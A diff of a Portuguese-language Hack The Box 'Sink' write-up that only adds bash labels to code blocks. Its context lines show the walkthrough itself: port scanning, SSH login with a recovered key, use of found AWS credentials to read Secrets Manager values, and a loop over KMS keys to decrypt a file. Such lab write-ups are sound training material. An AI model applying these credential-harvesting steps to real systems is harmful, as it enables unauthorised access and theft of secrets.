@@ -29,7 +29,7 @@ Vamos ao tralho!
 ## RECON
 
 ### Nmap
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Sink]
 └─$ sudo nmap -v -p- -sCV -O -Pn 10.10.10.225 --min-rate=512 
 PORT     STATE SERVICE VERSION
@@ -273,7 +273,7 @@ H6wje1uuX+VDZ8UB7lJ9HpPJiNawoBQ1hJfuveMjokkN2HR1rrEGHTDoSDmcVPxmHBWsHf
 
 Vamos salvá-la e tentar um acesso ssh.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Sink]
 └─$ vim id_rsa_marcus                                                                                                                                                                                                                    1 ⨯
                                                                                                                                                                                                                                              
@@ -290,7 +290,7 @@ E conseguimos nosso primeiro acesso ao server!!!
 
 A flag `user.txt` está no diretório do usuário marcus.
 
-```
+```bash
 marcus@sink:~$ ls -la
 total 32
 drwxr-xr-x 4 marcus marcus 4096 Jan 27  2021 .
@@ -348,7 +348,7 @@ $client->createLogStream([
 ```
 O que significa que podemos checar as configurações aws no server.
 
-```
+```bash
 marcus@sink:~$ aws configure
 AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
 AWS Secret Access Key [None]: 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
@@ -360,7 +360,7 @@ Default output format [None]: json
 
 Depois disso, podemos listar os `secrets`.
 
-```
+```bash
 marcus@sink:~$ aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager list-secrets
 ```
 
@@ -368,7 +368,7 @@ marcus@sink:~$ aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager list-s
 
 Com as informações obtidas, podemos obter os valores dos secrets.
 
-```
+```bash
 marcus@sink:~$ aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-HRbzR"
 ```
 
@@ -386,7 +386,7 @@ Dentro do diretório do usuário david, encontrei o arquivo `servers.enc` no dir
 
 Este arquivo está encriptado, pois é uma criptografia `server-side` da aws. Para conseguir abrí-lo, precisamos da key correta, novamente utilizaremos as configurações da aws.
 
-```
+```bash
 david@sink:~/Projects/Prod_Deployment$ aws configure
 AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
 AWS Secret Access Key [None]: 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
@@ -396,7 +396,7 @@ Default output format [None]: json
 
 Agora podemos listar as `keys`.
 
-```
+```bash
 david@sink:~/Projects/Prod_Deployment$ aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys
 ```
 
@@ -404,7 +404,7 @@ david@sink:~/Projects/Prod_Deployment$ aws --endpoint-url="http://127.0.0.1:4566
 
 Encontramos várias keys, para não tentarmos uma por uma, podemos fazer um script para testar uma de cada vez.
 
-```
+```bash
 #!/bin/bash
 
 for KEY in $(aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys | grep KeyId | awk -F\" '{ print $4 }')
